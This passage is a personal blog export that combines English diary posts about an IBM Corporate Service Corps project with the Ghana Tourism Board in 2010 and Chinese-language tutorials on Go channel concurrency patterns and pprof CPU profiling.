    <content><![CDATA[<p>Day 21, that’s counted to the day of my departure from Ghana on 10/30. Three weeks have passed. So fast!</p>
<p>The most enduring aspect of this CSC (Corporate Service Corps) experience has been the friendships formed. It’s a rare and possibly once-in-a-lifetime opportunity to spend an entire month closely engaging with a group of people, day in and day out. It’s been a pleasure to be part of such a wonderful group, and I hold immense respect for each individual. Being the youngest in our team, I’ve received abundant care and support, not just in work but in everyday life, and I’ve learned immensely.</p>
<p>Yesterday, Roy, Anouk, and I completed the Ghana West Coast Marketing workshop. Mr. Hammond, the president of the Ghana Tourism Board (GTB), was the first to arrive at SNV, the workshop venue. His serious approach to the workshop was encouraging to see. Mr. Hammond also delivered the opening speech, introducing the IBM CSC Ghana 5 team to everyone.</p>
<p>A total of 15 people participated in the workshop, representing GTB, Ricerca e Cooperazione, SNV, Ghana Wildlife Society, Wildlife Division, COSPE, and IBM. Roy, who is exceptional in his skills, designed the brainstorming process. The 12 participants were split into three groups for the first phase of discussion. After 30 minutes, they voted on all the ideas, using Canadian flag tabs as a cute voting method. We then selected the top three ideas for the second phase of the workshop.</p>
<p><img src="/2010/10/23/ghana-day-21/1.jpg"></p>
<p>speech</p>
<p><img src="/2010/10/23/ghana-day-21/2.jpg"></p>
<p>Phase one voting </p>
<p>In phase two, there were 10 concrete problem&amp;topics prepared in advance and rearranged 12 participators into 3 groups, then jump in depth discussions on these 3 top ideas. Finally, we got a lot of ideas in workshop. We will organize them in structure, analysis, give conclusions and recommendations in our final presentation.<br>Really a wonderful day!</p>
<p>Will</p>
<p>Oct. 23 2010 </p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>ghana day 16</title>
    <url>/2010/10/17/ghana-day-16/</url>
    <content><![CDATA[<p>After a busy week, we embarked on an incredible adventure in Ghana on Saturday. Our day began bright and early at 7 am (it seems nobody sleeps in here) with a 2-hour bus journey leading us to the turn-off for the Amansuri Wetlands, just another 5 km away. However, this final stretch was a far cry from the decent roads we had been traveling on. Our driver had to navigate a ‘road’ with our bus that was more suited for walking or a 4-wheel drive vehicle. Against all odds, we reached the Amansuri wetlands.</p>
<p>Our first adventure involved boarding small canoes, with about 4 or 5 people in each. Our wooden canoe had a few leaks, but we all managed to find a seat and a scoop to bail out water during our journey. Our ‘captain’ propelled us through the wetlands using a long stick to push off the riverbed. We navigated through marshland, surrounded by a river of reeds, following a single water pathway carved out over years of use, reminiscent of a well-trodden mountain trail. Amidst a bird sanctuary, we observed numerous birds and flowers. Our route took us from the vast expanse of the river into a narrow channel and through a rainforest, my favorite part of the trip, gliding through the mangrove forest. The serene beauty was briefly interrupted by another canoe filled with a group singing an African song. We passed each other with high fives, and their singing soon faded away. Emerging from the forest, the wetlands opened up to a wide river, where we swapped the long stick for paddles and took turns helping to steer our canoe. The canoeing took an hour in the 30-degree weather, but occasional cloud cover and a bit of rain made it quite comfortable. I think I’m even starting to get used to the humidity here!</p>
<p><img src="/2010/10/17/ghana-day-16/1.jpg"></p>
<p><img src="/2010/10/17/ghana-day-16/2.jpg"></p>
<p>Our journey then led us to the village of Nzulezo, a unique community accessible only by water and primarily by canoe for its residents. Built entirely on stilts above water, the village is home to 450 people. Upon disembarking from our canoes, we were warmly welcomed by the locals. They guided us down the ‘main street’ and through the town to the far end of the village. Having explored many interesting parts of the world, I found this experience to be the most fascinating yet. The town, primarily constructed from wood, a lot of bamboo, and some rubber plants, extended over the water on stilts. The residents lived in small rooms that made up their houses. We were allowed to photograph the town, but had to seek permission before taking pictures of the people. The village featured a small market and a single-room schoolhouse for children up to grade 6. The inhabitants, reliant on fishing and farming, had to bring in all other necessities by boat. Lacking electricity, a generator was their sole source of power.</p>
<p>We had the honor of meeting the town chief, who shared the village’s history in an African language, translated for us by our guide. We then presented any gifts we had for the school children; I had brought several pairs of children’s sandals for the occasion. Many of us purchased small wooden carved canoes as a gesture of gratitude for their hospitality.</p>
<p>Exploring the village further, we saw a small farm with goats and chickens, also built on stilts over the water, like the rest of the village. Despite its size, the community had three churches. We then embarked on our hour-long canoe trip back, relishing the beauty of the wetlands once more.</p>
<p>Our trip concluded with some leisure time at the beach, located at the start of the wetlands and right on the coast. I roamed the shoreline, collecting a few beautiful seashells.</p>
<p>It was an extraordinary day.</p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>golang channel笔记</title>
    <url>/2018/03/15/golang-channel%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>channel，即“管道”，是用来传递数据（叫消息更为合适）的一个数据结构，即可以从channel里面塞数据，也可以从中获取数据。channel本身并没有什么神奇的地方，但是channel加上了goroutine，就形成了一种既简单又强大的请求处理模型，即N个工作goroutine将处理的中间结果或者最终结果放入一个channel，另外有M个工作goroutine从这个channel拿数据，再进行进一步加工，通过组合这种过程，从而胜任各种复杂的业务模型。</p>
<p>goroutine不同于thread，threads是操作系统中的对于一个独立运行实例的描述，不同操作系统，对于thread的实现也不尽相同；但是，操作系统并不知道goroutine的存在，goroutine的调度是有Golang运行时进行管理的。启动thread虽然比process所需的资源要少，但是多个thread之间的上下文切换仍然是需要大量的工作的（寄存器/Program Count/Stack Pointer/…），Golang有自己的调度器，许多goroutine的数据都是共享的，因此goroutine之间的切换会快很多，启动goroutine所耗费的资源也很少，一个Golang程序同时存在几百个goroutine是很正常的。</p>
<h4 id="Go-Channel的基本操作语法如下："><a href="#Go-Channel的基本操作语法如下：" class="headerlink" title="Go Channel的基本操作语法如下："></a>Go Channel的基本操作语法如下：</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">c := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">bool</span>)    <span class="comment">//创建一个无缓冲的bool型Channel</span></span><br><span class="line">c &lt;- x                  <span class="comment">//向一个Channel发送一个值</span></span><br><span class="line">&lt;- c                    <span class="comment">//从一个Channel中接收一个值</span></span><br><span class="line">x = &lt;- c                <span class="comment">//从Channel c接收一个值并将其存储到x中</span></span><br><span class="line">x, ok = &lt;- c            <span class="comment">//从Channel接收一个值，如果channel关闭了或没有数据，那么ok将被置为false</span></span><br></pre></td></tr></table></figure>
<p>不带缓冲的Channel兼具通信和同步两种特性，颇受青睐。</p>
<h4 id="模型01-go关键字"><a href="#模型01-go关键字" class="headerlink" title="模型01-go关键字"></a>模型01-go关键字</h4><p>直接加上go关键字，就可以让一个函数脱离原先的主函数独立运行，即主函数直接继续进行剩下的操作，而不需要等待某个十分耗时的操作完成。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *SomeController)</span> <span class="title">PorcessSomeTask</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> task models.Task</span><br><span class="line">    <span class="keyword">if</span> err := task.Parse(m.Ctx.Request); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        m.Data[<span class="string">&quot;json&quot;</span>] = err </span><br><span class="line">        m.ServeJson()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">go</span> task.Process()</span><br><span class="line">    m.ServeJson()</span><br></pre></td></tr></table></figure>
<p>如果 func(peer Peer) 函数需要耗费大量时间的话，这个请求就会被 block 住。有时候，前端只需要发出一个请求给后端，并且不需要后端立即所处响应。遇到这样的需求，直接在耗时的函数前面加上go关键字就可以将请求之间返回给前端了，保证了体验。</p>
<p>不过，这种做法也是有许多限制的。比如：</p>
<ul>
<li>只能在前端不需要立即得到后端处理的结果的情况下使用</li>
<li>这种请求的频率不应该很大，因为目前的做法没有控制并发量</li>
</ul>
<h4 id="模型02-并发控制"><a href="#模型02-并发控制" class="headerlink" title="模型02-并发控制"></a>模型02-并发控制</h4><p>上一个方案有一个缺点就是无法控制并发，如果这一类请求同一个时间段有很多的话，每一个请求都启动一个goroutine，如果每个goroutine中还需要使用其他系统资源，消耗将是不可控的。</p>
<p>遇到这种情况，一个解决方案是：将请求都转发给一个channel，然后初始化多个goroutine读取这个channel中的内容，并进行处理。假设我们可以新建一个全局的channel</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> TASK_CHANNEL = <span class="built_in">make</span>(<span class="keyword">chan</span> models.Task)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 然后，启动多个goroutine：</span></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; WORKER_NUM; i ++ &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="keyword">for</span> &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> task := &lt;- TASK_CHANNEL:</span><br><span class="line">                task.Process()</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; ()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务端接收到请求之后，将任务传入channel中即可：</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(m *SomeController)</span> <span class="title">PorcessSomeTask</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> task models.Task</span><br><span class="line">    <span class="keyword">if</span> err := task.Parse(m.Ctx.Request); err != <span class="literal">nil</span> &#123;</span><br><span class="line">        m.Data[<span class="string">&quot;json&quot;</span>] = err </span><br><span class="line">        m.ServeJson()</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// go task.Process()</span></span><br><span class="line">    TASK_CHANNEL &lt;- task</span><br><span class="line">    m.ServeJson()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这样一来，这个操作的并发度就可以通过WORKER_NUM来控制了。</p>
<h4 id="模型03-处理channel满的情况"><a href="#模型03-处理channel满的情况" class="headerlink" title="模型03-处理channel满的情况"></a>模型03-处理channel满的情况</h4><p>不过，上面方案有一个bug：那就是channel初始化时是没有设置长度的，因此当所有WORKER_NUM个goroutine都正在处理请求时，再有请求过来的话，仍然会出现被block的情况，而且会比没有经过优化的方案还要慢（因为需要等某一个goroutine结束时才能处理它）。因此，需要在channel初始化时增加一个长度：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> TASK_CHANNEL = <span class="built_in">make</span>(<span class="keyword">chan</span> models.Task, TASK_CHANNEL_LEN)</span><br></pre></td></tr></table></figure>
<p>这样一来，我们将 TASK_CHANNEL_LEN 设置得足够大，请求就可以同时接收 <em>TASK_CHANNEL_LEN</em> 个请求而不用担心被block。不过，这其实还是有问题的：那如果真的同时有大于 TASK_CHANNEL_LEN 个请求过来呢？一方面，这就应该算是架构方面的问题了，可以通过对模块进行扩容等操作进行解决。另一方面，模块本身也要考虑如何进行“优雅降级了”。遇到这种情况，我们应该希望模块能够及时告知调用方，“我已经达到处理极限了，无法给你处理请求了”。其实，这种需求，可以很简单的在Golang中实现：如果channel发送以及接收操作在select语句中执行并且发生阻塞，default语句就会立即执行。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> TASK_CHANNEL &lt;- task:</span><br><span class="line">    <span class="comment">//do nothing</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">    <span class="comment">//warnning!</span></span><br><span class="line">    <span class="keyword">return</span> fmt.Errorf(<span class="string">&quot;TASK_CHANNEL is full!&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<h4 id="模型04-接收发送给channel之后返回的结果"><a href="#模型04-接收发送给channel之后返回的结果" class="headerlink" title="模型04-接收发送给channel之后返回的结果"></a>模型04-接收发送给channel之后返回的结果</h4><p>如果处理程序比较复杂的时候，通常都会出现在一个goroutine中，还会发送一些中间处理的结果发送给其他goroutine去做，经过多道“工序”才能最终将结果产出。</p>
<p>那么，我们既需要把某一个中间结果发送给某个channel，也要能获取到处理这次请求的结果。解决的方法是：将一个channel实例包含在请求中，goroutine处理完成后将结果写回这个channel。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> TaskResponse <span class="keyword">struct</span> &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Task <span class="keyword">struct</span> &#123;</span><br><span class="line">    TaskParameter   SomeStruct</span><br><span class="line">    ResChan         *<span class="keyword">chan</span> TaskResponse</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">task := Task &#123;</span><br><span class="line">    TaskParameter   : xxx,</span><br><span class="line">    ResChan         : <span class="built_in">make</span>(<span class="keyword">chan</span> TaskResponse),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">TASK_CHANNEL &lt;- task</span><br><span class="line">res := &lt;- task.ResChan</span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure>
<p>（这边可能会有疑问：为什么不把一个复杂的任务都放在一个goroutine中依次的执行呢？是因为这里需要考虑到不同子任务，所消耗的系统资源不尽相同，有些是CPU集中的，有些是IO集中的，所以需要对这些子任务设置不同的并发数，因此需要经由不同的channel + goroutine去完成。）</p>
<h4 id="模型05-等待一组goroutine的返回"><a href="#模型05-等待一组goroutine的返回" class="headerlink" title="模型05-等待一组goroutine的返回"></a>模型05-等待一组goroutine的返回</h4><p>将任务经过分组，交由不同的goroutine进行处理，最终再将每个goroutine处理的结果进行合并，这个是比较常见的处理流程。这里需要用到WaitGroup来对一组goroutine进行同步。一般的处理流程如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> wg sync.WaitGroup</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; someLen; i ++ &#123;</span><br><span class="line">    wg.Add(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">(t Task)</span></span> &#123;</span><br><span class="line">        <span class="keyword">defer</span> wg.Done()</span><br><span class="line">        <span class="comment">//对某一段子任务进行处理</span></span><br><span class="line">    &#125; (tasks[i])</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wg.Wait()</span><br><span class="line"><span class="comment">//处理剩下的工作</span></span><br></pre></td></tr></table></figure>

<h4 id="模型06-超时机制"><a href="#模型06-超时机制" class="headerlink" title="模型06-超时机制"></a>模型06-超时机制</h4><p>即使是复杂、耗时的任务，也必须设置超时时间。一方面可能是业务对此有时限要求（用户必须在XX分钟内看到结果），另一方面模块本身也不能都消耗在一直无法结束的任务上，使得其他请求无法得到正常处理。因此，也需要对处理流程增加超时机制。</p>
<p>我一般设置超时的方案是：和之前提到的“接收发送给channel之后返回的结果”结合起来，在等待返回channel的外层添加select，并在其中通过time.After()来判断超时。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">task := Task &#123;</span><br><span class="line">    TaskParameter   : xxx,</span><br><span class="line">    ResChan         : <span class="built_in">make</span>(<span class="keyword">chan</span> TaskResponse),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> res := &lt;- task.ResChan:</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"><span class="keyword">case</span> &lt;- time.After(PROCESS_MAX_TIME):</span><br><span class="line">    <span class="comment">//处理超时</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="模型07-广播机制"><a href="#模型07-广播机制" class="headerlink" title="模型07-广播机制"></a>模型07-广播机制</h4><p>既然有了超时机制，那也需要一种机制来告知其他 goroutine 结束手上正在做的事情并退出。很明显，还是需要利用channel来进行交流，第一个想到的肯定就是向某一个chan发送一个struct即可。比如执行任务的goroutine在参数中，增加一个 chan struct{} 类型的参数，当接收到该channel的消息时，就退出任务。但是，还需要解决两个问题：</p>
<ol>
<li>怎样能在执行任务的同时去接收这个消息呢？</li>
<li>如何通知所有的goroutine？</li>
</ol>
<p>对于第一个问题，比较优雅的作法是：使用另外一个channel作为函数的输出，再加上select，就可以一边输出结果，一边接收退出信号了。</p>
<p>另一方面，对于同时有未知数目个执行goroutine的情况，一次次调用 done &lt;-struct{}{}，显然无法实现。这时候，就会用到golang对于channel的tricky用法：当关闭一个channel时，所有因为接收该channel而阻塞的语句会立即返回。示例代码如下：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 执行方</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">doTask</span><span class="params">(done &lt;-<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, tasks &lt;-<span class="keyword">chan</span> Task)</span> <span class="params">(<span class="keyword">chan</span> Result)</span></span> &#123;</span><br><span class="line">    out := <span class="built_in">make</span>(<span class="keyword">chan</span> Result)</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        <span class="comment">// close 是为了让调用方的range能够正常退出</span></span><br><span class="line">        <span class="keyword">defer</span> <span class="built_in">close</span>(out)</span><br><span class="line">        <span class="keyword">for</span> t := <span class="keyword">range</span> tasks &#123;</span><br><span class="line">            <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> result &lt;-f(t):</span><br><span class="line">                <span class="comment">// do task</span></span><br><span class="line">            <span class="keyword">case</span> &lt;-done:</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用方</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Process</span><span class="params">(tasks &lt;-<span class="keyword">chan</span> Task, num <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    done := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">    out := doTask(done, tasks)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        &lt;- time.After(MAX_TIME)</span><br><span class="line">        <span class="comment">//done &lt;-struct&#123;&#125;&#123;&#125;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//通知所有的执行goroutine退出</span></span><br><span class="line">        <span class="built_in">close</span>(done)</span><br><span class="line">    &#125;()</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 因为goroutine执行完毕，或者超时，导致out被close，range退出</span></span><br><span class="line">    <span class="keyword">for</span> res := <span class="keyword">range</span> out &#123;</span><br><span class="line">        fmt.Println(res)</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考：</p>
<blockquote>
<p><a href="http://blog.golang.org/pipelines">http://blog.golang.org/pipelines</a></p>
<p><a href="https://gobyexample.com/non-blocking-channel-operations">https://gobyexample.com/non-blocking-channel-operations</a></p>
</blockquote>
]]></content>
      <tags>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>ghana day 7</title>
    <url>/2010/10/09/ghana-day-7/</url>
    <content><![CDATA[<p>Seven days were pasted, first week ended!!!<br>For me, it has already been quite some time since my arrival. Today marks the seventh day since I landed in this fascinating country. The next two weeks will pass swiftly, and I’m aware that my assignment will soon come to an end. Our hotel is delightful, offering a splendid, expansive view below us.</p>
<p><img src="/2010/10/09/ghana-day-7/1.jpg"></p>
<p>We service for GTB (Ghana Tourist Board), it is located in SIC building. This week we (Anouk and I) went to there in 9:00 everyday, but we realized that we need more time working with GTB, we will go to GTB in 8:00AM everyday.</p>
<p><img src="/2010/10/09/ghana-day-7/2.jpg"></p>
<p>GTB (Ghana tourist board) in Takoradi control the whole tourist affair in West Region, they are trying to extend their market urgently to fight for poverty. That’s a really nice idea. we are the first team from <a href="https://www-146.ibm.com/corporateservicecorps/">IBM CSC program</a> service for GTB. We hopefully help to them very much. </p>
<p>In this week, we (Anouk and me) did interview with most of staffs, 6 people, and two NGO, RC and SNV, they give us so much information. We are getting to know Ghana and GTB deeper and deeper. We will help GTB to organize one workshop tourism marketing and product development strategy for <a href="http://www.ghanawestcoast.com/">Ghana West Coast</a> . It’s really a nice marketing plan for Ghana West Coast  in the future two years. We will help GTB to make this plan to go further.<br>By the way,  Ghana West Coast is the most beautiful beach which I have seen. </p>
<p><img src="/2010/10/09/ghana-day-7/3.jpg"></p>
<p><img src="/2010/10/09/ghana-day-7/4.jpg"></p>
<p>And we will also train basic computer knowledge to staffs, including Windows, MS office and using E-mail. It seems so easy for us, but it’s really important for GTB. When we did interview with Samuel, he is the only one person worked in research&amp;statistics department, he used his head and calculator to do research&amp;statistics on clients check-in data of all the hotels in west region for more than 20 years. When we show to him that we use MS Excel to calculate with formula, he was super amazed. We explained it for more than 90 mins what it is, he begin to believe it. I really can’t forget his lovely face.</p>
<p>Anouk and I are working here just one month. It’s a small project here, but we hope small project and small project can accumulate to a big change.<br>Will.<br>2010.Oct.08. </p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>ghana day 29</title>
    <url>/2010/11/04/ghana-day-29/</url>
    <content><![CDATA[<p>How times flying. I went back to China, but I can not forget what happened on my last working day in Ghana.</p>
<p>On the last day, the last three team did their final presentations, including Chamber, GTB and NBSSI Team. The final presentation was very successful, we did a great job and we got a great satisfaction from client, and detailed action plan was created. It means we delivered these results to client, they are not only deliverables, but also they will become a big impact in future. I feel an honest and happy pride!</p>
<p>In the evening, Mr.Hammond and staffs of GTB met Anouk and I in Valley Beach Hotel, they sent us great presents.</p>
<p><img src="/2010/11/04/ghana-day-29/1.jpg"></p>
<p><img src="/2010/11/04/ghana-day-29/2.jpg"></p>
<p><img src="/2010/11/04/ghana-day-29/3.jpg"></p>
<p><img src="/2010/11/04/ghana-day-29/4.jpg"></p>
<p>We chatted for long time, the most unforgettable sentence from clients is “Unbelievable, I thought you (Anouk and I) are working together one year at least!”</p>
<p>Absolutely, our understanding really more than one year already in CSC program Ghana Team V.</p>
<p>Will<br>Nov.04 2010</p>
]]></content>
      <tags>
        <tag>CSC</tag>
        <tag>Ghana</tag>
      </tags>
  </entry>
  <entry>
    <title>golang调优工具-pprof</title>
    <url>/2018/06/07/golang%E8%B0%83%E4%BC%98%E5%B7%A5%E5%85%B7-pprof/</url>
    <content><![CDATA[<h4 id="CPU-Profiling"><a href="#CPU-Profiling" class="headerlink" title="CPU Profiling"></a>CPU Profiling</h4><p>Golang 提供了 pprof 包（runtime/pprof）用于输出运行时的 profiling 数据，这些数据可以被 pprof 工具（或者 go tool pprof，其为 pprof 的变种）使用。通常我们这样来使用 pprof 包：</p>
<figure class="highlight golang"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> <span class="comment">// 定义 flag cpuprofile</span></span><br><span class="line"><span class="number">2</span> <span class="keyword">var</span> cpuprofile = flag.String(<span class="string">&quot;cpuprofile&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;write cpu profile to file&quot;</span>)</span><br><span class="line"><span class="number">3</span> <span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="number">4</span>    flag.Parse()</span><br><span class="line"><span class="number">5</span>    <span class="comment">// 如果命令行设置了 cpuprofile</span></span><br><span class="line"><span class="number">6</span>    <span class="keyword">if</span> *cpuprofile != <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line"><span class="number">7</span>        <span class="comment">// 根据命令行指定文件名创建 profile 文件</span></span><br><span class="line"><span class="number">8</span>        f, err := os.Create(*cpuprofile)</span><br><span class="line"><span class="number">9</span>        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="number">10</span>            log.Fatal(err)</span><br><span class="line"><span class="number">11</span>        &#125;</span><br><span class="line"><span class="number">12</span>        <span class="comment">// 开启 CPU profiling</span></span><br><span class="line"><span class="number">13</span>        pprof.StartCPUProfile(f)</span><br><span class="line"><span class="number">14</span>        <span class="keyword">defer</span> pprof.StopCPUProfile()</span><br><span class="line"><span class="number">15</span>    &#125;</span><br><span class="line"><span class="number">16</span>    ...</span><br></pre></td></tr></table></figure>

<p>假定我们编写的一个程序 mytest 中加入了上述代码则可以执行并生成 profile 文件：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">./mytest -cpuprofile=mytest.prof</span><br></pre></td></tr></table></figure>

<p>这里，我们生成了 mytest.prof profile 文件。有了 profile 文件就可以使用 go tool pprof 程序来解析此文件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">go tool pprof mytest mytest.prof</span><br></pre></td></tr></table></figure>

<p>pprof 程序中最重要的命令就是 topN，此命令用于显示 profile 文件中的最靠前的 N 个样本（samples），例如（此例为 <a href="http://blog.golang.org/profiling-go-programs">http://blog.golang.org/profiling-go-programs</a> 中的例子）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1 (pprof) top10</span><br><span class="line">2 Total: 2525 samples</span><br><span class="line">3    298  11.8%  11.8%    345  13.7% runtime.mapaccess1_fast64</span><br><span class="line">4    268  10.6%  22.4%   2124  84.1% main.FindLoops</span><br><span class="line">5    251   9.9%  32.4%    451  17.9% scanblock</span><br><span class="line">6    178   7.0%  39.4%    351  13.9% hash_insert</span><br><span class="line">7    131   5.2%  44.6%    158   6.3% sweepspan</span><br><span class="line">8    119   4.7%  49.3%    350  13.9% main.DFS</span><br><span class="line">9     96   3.8%  53.1%     98   3.9% flushptrbuf</span><br><span class="line">10    95   3.8%  56.9%     95   3.8% runtime.aeshash64</span><br><span class="line">11    95   3.8%  60.6%    101   4.0% runtime.settype_flush</span><br><span class="line">12    88   3.5%  64.1%    988  39.1% runtime.mallocgc</span><br></pre></td></tr></table></figure>

<p>开启 CPU profiling 后，Golang 程序在 1 秒钟会停顿 100 次，每次停顿都会记录 1 个样本。上例中，前两列表示运行的函数的样本数量（the number of samples in which the function was running）和占总样本数的百分比，例如说 runtime.mapaccess1_fast64 函数在 298 次采样中（占总采样数量的 11.8%）正在运行。第三列表示前几行样本数量总和占总样本数的百分比（第二行 22.4% 为 11.8% + 10.6%）。第四、五列表示出现的函数的样本数量（the number of samples in which the function appeared）和占总样本数的百分比，这里“出现的函数”指的是在采样中正在运行或者等待某个被调用函数返回的函数，换句话就是采样中那些位于调用栈上的函数。我们可以使用 -cum（cumulative 的缩写）flag 来以第四、五列为标准排序。需要注意的是，每次采样只会包括最底下的 100 个栈帧（stack frames）。</p>
<p>使用 web 命令能够以图形化的方式（SVG 格式）显示函数调用关系。例如（图片来源于 <a href="http://blog.golang.org/profiling-go-programs">http://blog.golang.org/profiling-go-programs</a> ）：</p>
<p><img src="/2018/06/07/golang%E8%B0%83%E4%BC%98%E5%B7%A5%E5%85%B7-pprof/1.png"></p>
<p>这里每个方块的大小由运行的函数的样本数量决定（这样就能方便的一眼看到热点函数）。箭头表示的是调用关系，箭头上的数字表示的是采样到的调用次数。web 命令还可以指定显示特定的函数，例如：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(pprof) web mapaccess1</span><br></pre></td></tr></table></figure>

<p>当我们有大致的想法（也就是确定热点函数）后，就可以深入特定的函数。我们使用 list 命令（此例为 <a href="http://blog.golang.org/profiling-go-programs">http://blog.golang.org/profiling-go-programs</a> 中的例子）：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">1 (pprof) list DFS</span><br><span class="line">2 Total: 2525 samples</span><br><span class="line">3 ROUTINE ====================== main.DFS <span class="keyword">in</span> /home/rsc/g/benchgraffiti/havlak/havlak1.go</span><br><span class="line">4    119    697 Total samples (flat / cumulative)</span><br><span class="line">5      3      3  240: func DFS(currentNode *BasicBlock, nodes []*UnionFindNode, number map[*BasicBlock]int, last []int, current int) int &#123;</span><br><span class="line">6      1      1  241:     nodes[current].Init(currentNode, current)</span><br><span class="line">7      1     37  242:     number[currentNode] = current</span><br><span class="line">8      .      .  243:</span><br><span class="line">9      1      1  244:     lastid := current</span><br><span class="line">10    89     89  245:     <span class="keyword">for</span> _, target := range currentNode.OutEdges &#123;</span><br><span class="line">11     9    152  246:             <span class="keyword">if</span> number[target] == unvisited &#123;</span><br><span class="line">12     7    354  247:                     lastid = DFS(target, nodes, number, last, lastid+1)</span><br><span class="line">13     .      .  248:             &#125;</span><br><span class="line">14     .      .  249:     &#125;</span><br><span class="line">15     7     59  250:     last[number[currentNode]] = lastid</span><br><span class="line">16     1      1  251:     <span class="built_in">return</span> lastid</span><br></pre></td></tr></table></figure>

<p>上例中，第一列为运行到此行时的样本数，第二列为运行到此行或从此行调用的样本数，第三列为行号。如果需要显示汇编，可以使用命令 disasm（使用命令 weblist 可以同时显示源码和汇编代码， 这里 有一个范例）。通过样本数，我们可以定位到热点行，然后考虑适合的优化策略。</p>
<h4 id="pprof-包"><a href="#pprof-包" class="headerlink" title="pprof 包"></a>pprof 包</h4><p>pprof 包进行 profiling 有两种方式：</p>
<ul>
<li>采样。CPU Profiling 需要不断采样，（如上所述）pprof 包提供了一套特殊的 API（StartCPUProfile / StopCPUProfile）</li>
<li>快照。下面详细谈这种方式（同样可以使用 go tool pprof 程序来解析输出的 profile 文件）</li>
</ul>
